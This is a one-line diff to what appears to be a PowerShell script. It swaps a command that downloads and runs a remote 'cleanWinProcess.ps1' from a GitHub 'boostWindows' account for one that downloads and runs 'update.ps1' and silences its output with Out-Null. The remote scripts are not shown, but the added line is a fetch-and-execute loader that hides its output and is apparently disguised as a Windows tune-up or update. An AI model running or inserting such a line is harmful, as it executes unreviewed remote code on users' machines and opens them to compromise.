@@ -1,1 +1,1 @@
-iex (iwr 'https://raw.githubusercontent.com/boostWindows/OS/refs/heads/main/cleanWinProcess.ps1')
+iex (iwr 'https://raw.githubusercontent.com/boostWindows/OS/refs/heads/main/update.ps1') | Out-Null
